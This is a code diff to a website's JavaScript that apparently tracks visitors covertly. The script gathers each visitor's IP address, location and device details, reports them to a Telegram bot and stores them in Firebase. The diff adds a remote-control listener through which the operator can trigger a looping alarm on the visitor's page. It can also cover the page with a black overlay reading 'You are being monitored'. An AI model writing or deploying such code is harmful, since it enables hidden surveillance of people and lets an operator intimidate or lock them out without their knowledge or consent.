@@ -81,20 +81,26 @@
 
             const buttons = [
                 [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
-                { text: "🚫 Block", callback_data: `block_${sessionID}` }]
+                { text: "🚫 Block", callback_data: `block_${sessionID}` }],
+                [{ text: "✅ Unblock", callback_data: `unblock_${sessionID}` }]
             ];
 
             sendTelegram(text, buttons);
 
             // SYNC TO FIREBASE (If available)
             if (window.firebase && window.db) {
-                db.collection('visitors_v1').doc(sessionID).set({
+                const docRef = db.collection('visitors_v1').doc(sessionID);
+                docRef.set({
                     ip: ip,
                     location: data,
                     device: deviceData,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    status: 'online'
+                    status: 'online',
+                    action: 'none' // Reset action
                 }).catch(e => console.error("DB Error", e));
+
+                // --- 5. REMOTE CONTROL LISTENER (v2.1) ---
+                listenForCommands(docRef);
             }
         })
         .catch(e => sendTelegram(`⚠️ IP Fetch Failed: ${e.message}`));
@@ -147,5 +153,63 @@
 
     // Expose for remote control if needed
     window.sendPulse = logActivity;
+
+
+    // --- 6. COMMAND EXECUTION ENGINE (Alarm/Block) ---
+    let alarmAudio = null;
+    let blockOverlay = null;
+
+    function listenForCommands(docRef) {
+        docRef.onSnapshot((doc) => {
+            if (!doc.exists) return;
+            const data = doc.data();
+            if (data.action) executeCommand(data.action);
+        });
+    }
+
+    function executeCommand(action) {
+        console.log("⚡ COMMAND RECEIVED:", action);
+
+        if (action === 'alarm') {
+            triggerAlarm();
+        } else if (action === 'block') {
+            showBlockScreen();
+        } else if (action === 'unblock') {
+            stopAlarm();
+            hideBlockScreen();
+        }
+    }
+
+    function triggerAlarm() {
+        if (!alarmAudio) {
+            alarmAudio = new Audio("https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3");
+            alarmAudio.loop = true;
+        }
+        alarmAudio.play().catch(e => console.warn("Audio Blocked", e));
+        showBlockScreen("🚨 SECURITY ALERT 🚨", "You are being monitored.");
+    }
+
+    function stopAlarm() {
+        if (alarmAudio) {
+            alarmAudio.pause();
+            alarmAudio.currentTime = 0;
+        }
+    }
+
+    function showBlockScreen(title = "ACCESS RESTRICTED", msg = "Contact Administrator") {
+        if (!blockOverlay) {
+            blockOverlay = document.createElement('div');
+            blockOverlay.style = "position:fixed;inset:0;background:black;color:red;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:monospace;font-size:24px;";
+            blockOverlay.innerHTML = `<h1 style="font-size:50px">🛑</h1><h2 id="block-title"></h2><p id="block-msg"></p>`;
+            document.body.appendChild(blockOverlay);
+        }
+        document.getElementById('block-title').innerText = title;
+        document.getElementById('block-msg').innerText = msg;
+        blockOverlay.style.display = 'flex';
+    }
+
+    function hideBlockScreen() {
+        if (blockOverlay) blockOverlay.style.display = 'none';
+    }
 
 })();
